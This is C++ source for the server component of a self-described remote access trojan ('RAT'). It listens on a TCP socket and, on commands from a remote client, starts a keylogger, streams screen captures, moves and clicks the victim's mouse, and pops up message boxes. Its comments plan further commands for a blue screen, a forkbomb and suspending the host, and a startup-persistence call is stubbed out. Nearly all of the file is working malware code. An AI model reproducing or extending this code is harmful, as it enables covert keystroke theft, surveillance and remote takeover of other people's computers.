#include "server_header.h"



int main(){

    //AddtoStartup();

//Map messagebox responses!

    dictionary["TRIGMSGBOX"] = TRIGMSGBOX;

    dictionary["KEYLOG"] = KEYLOG;
    dictionary["STOPKEYLOG"] = STOPKEYLOG;

    dictionary["DISCONNECT"] = DISCONNECT;

    dictionary["STREAMPICT"] = STREAMPICT;
    dictionary["STOPSTREAM"] = STOPSTREAM;


    dictionary["MOVMOUSECLK"] = MOVMOUSECLK;

    MSGBOX_TYPES["Abort Retry Ignore"]                    = MB_ABORTRETRYIGNORE;
    MSGBOX_TYPES["Help MsgBox"] /*NOTE:WM_HELP NOT USED*/ = MB_HELP;
    MSGBOX_TYPES["Ok Cancel"]                             = MB_OKCANCEL;
    MSGBOX_TYPES["Yes No"]                                = MB_YESNO;


    MSGBOX_ICONS["Exclamation Icon"]      = MB_ICONEXCLAMATION;
    MSGBOX_ICONS["Warning Icon"]          = MB_ICONWARNING;
    MSGBOX_ICONS["Error Icon"]            = MB_ICONINFORMATION;
    MSGBOX_ICONS["Stop Icon"]             = MB_ICONSTOP;



/*INITIALIZE WINSOCKETS FOR OUR RAT, WE WILL BE COMMUNICATING WITH CLIENT TO MANIPULATE THE HOST*/



    HandleError(WSAStartup(MAKEWORD(2,2), &wsa));

    HandleError((sa = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET);


    server.sin_addr.s_addr = inet_addr (ipaddress.c_str());      //initialize members of server structure
    server.sin_family = AF_INET;
    server.sin_port = htons(portnumber);

    HandleError(bind(sa, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR);

    HandleError(listen(sa, SOMAXCONN));

    while(KILLSERVER){


        clientsock = accept(sa, (struct sockaddr *)&client, NULL);
        //HandleError(clientsock);
        //send(clientsock, "Message!", 9, 0);

        while(1){

        if(clientsock == INVALID_SOCKET){
            break;
        }
        int counter = 0;

        //memsuet(server_reply, '\0', buffersize);



                /*NOTE: MESSAGES WILL BE SENT IN OPERATOR>OPERAND< FORMAT. MEANING THAT THE > SYMBOL DISTINGUISHES BETWEEN THE TWO. */
                /* THE < SYMBOL DENOTES END OF MESSAGE*/
                /*FOR EXAMPLE, IF WE WANT TO MAKE A MESSAGEBOX DISPLAYING HELLO, WE WOULD SAY MSGBOXTRIG>CONTENT< */
                /*Messagebox contents will be sent as follows: title/message-MSGBOXSTYLE_ICON */
                /*Therefore, the complete syntax would be:  TRIGMSGBOX>myTitle/myMessage-MSGBOXTYLE_MESSAGEBOXICON< */
                /*SOMETIMES THERE WILL BE NO OPERAND, JUST AN OPERATOR*/
                /*FOR EXAMPLE, IT MAKES NO SENSE TO HAVE AN OPERATOR TO TRIGGER A BSOD. THEREFORE, THE SYNTAX FOR THAT WILL BE*/
                /*TRIGGERBSOD><*/
                /*LETS SAY WE WANT TO DO SOME SKID SHIT LIKE TRIGGER A FORKBOMB WITH THE CLIENT. THE OPERATOR AND OPERAND WOULD BE SOMETHING LIKE*/
                /*FORKTRIGGER><*/
                /*OR WE WANT TO SUSPEND THE COMPUTER FOR A LIMITED AMOUNT OF SECONDS*/
                /*SUSPENDHOST>45<*/


            //send(clientsock, "KEYLOG><", 8, 0);
            PKT pkt;

            HandleError(recv(clientsock, (char*)&pkt, sizeof(pkt), 0));

            //string COMMAND(pkt.command);

            //map<string, SERVERMESSAGE>::iterator i = dictionary.find(COMMAND);


        //CLEAR STRING BEFORE PROCESSING! MAKES THINGS NICE AND CLEAN!!
        server_operator.clear();
        server_operand.clear();
        server_operator.append(pkt.command);
        //After we recieve which operation to do, then we filter it in the switch.
        //After stepping through the switch, parse the data into appropriate means.
        //Each command has a different way of dealing with data.

        //server_operand.append(pkt.data);

            /*int forcount = 0;
            //PARSE THE OPERATOR
            for (; server_reply[forcount] != '>'; forcount++){
               server_operator += server_reply[forcount];
            }

            //PARSE THE OPERAND
            forcount++;
            for (; server_reply[forcount] != '<'; forcount++){

                server_operand += server_reply[forcount];

            }*/


             map<string, SERVERMESSAGE>::iterator i = dictionary.find(server_operator);


            //i->second corresponds to the enumerated message

            switch(i->second){

                case TRIGMSGBOX:{

                      server_operand.append(reinterpret_cast<const char*>(pkt.data));

                      HandleError(_beginthreadex(NULL, 0, &TrigBox, &server_operand, 0, NULL));  //not really necessary to create an unused handle, but its here incase you need to use it



                    }break;

                case STOPSTREAM:{

                    //MessageBox(NULL,NULL,NULL,NULL);
                    stream_is_true = false;



                    }break;

                case KEYLOG:

                      HandleError(_beginthreadex(NULL,0, &KeyLog, NULL, 0, &KEYLOG_ID));

                    break;

                case STREAMPICT:{

                      HandleError(_beginthreadex(NULL, 0, &StreamPict, NULL, 0, NULL));

                }
                    break;

                case MOVMOUSECLK:{

                        int x, y;

                        x  = pkt.data[0] << 24;
                        x |= pkt.data[1] << 16;
                        x |= pkt.data[2] << 8;
                        x |= pkt.data[3];

                        y  = pkt.data[4] << 24;
                        y |= pkt.data[5] << 16;
                        y |= pkt.data[6] << 8;
                        y |= pkt.data[7];

                       // x = (int)pkt.data[0];
                       // y = (int)pkt.data[1];
                        INPUT BTNDWN[2];

                        ZeroMemory(BTNDWN, sizeof(BTNDWN));

                        BTNDWN[0].type = INPUT_MOUSE;
                        std::cout<< x<<" , " << y;
                        //BTNDWN[0].mi.dx = (unsigned int)pkt.data[0];
                        //BTNDWN[0].mi.dy = (unsigned int)pkt.data[1];
                        //Prepare to move mouse and downclick
                        BTNDWN[0].mi.dwFlags = pkt.data[8] == 'L' ? (MOUSEEVENTF_LEFTDOWN) :
                                                                 (pkt.data[8] == 'R' ? (MOUSEEVENTF_RIGHTDOWN) : 0);
                        //Prepare to upclick
                        BTNDWN[1].type = INPUT_MOUSE;
                        BTNDWN[1].mi.dwFlags = pkt.data[8] == 'L' ? (MOUSEEVENTF_LEFTUP) :
                                                                 (pkt.data[8] == 'R' ? (MOUSEEVENTF_RIGHTUP) : 0);
                        //Move cursor, then
                        SetCursorPos(x, y);
                        Sleep(10);

                        //execute clicks!

                            SendInput(2, BTNDWN, sizeof(INPUT));


                        std::cout << GetLastError();
                        //std::cout << GetLastError();
                        //mouse_event( ), (unsigned int)pkt.data[0], (unsigned int)pkt.data[1], 0, 0);





                }break;



                case STOPKEYLOG: HandleError(PostThreadMessage(KEYLOG_ID, WM_QUIT, NULL, NULL));
                    break;
                case DISCONNECT: clientsock = INVALID_SOCKET;
                    break;
                default: HandleError(MessageBox(NULL, "Message unrecognized!", "Exception!", NULL));
                    break;

            }

               //send(clientsock, "Ack", 4, 0);
        }



    }
    HandleError(MessageBox(NULL,"D/c", NULL,NULL));
            closesocket(sa);
            WSACleanup();

    return 0;
}

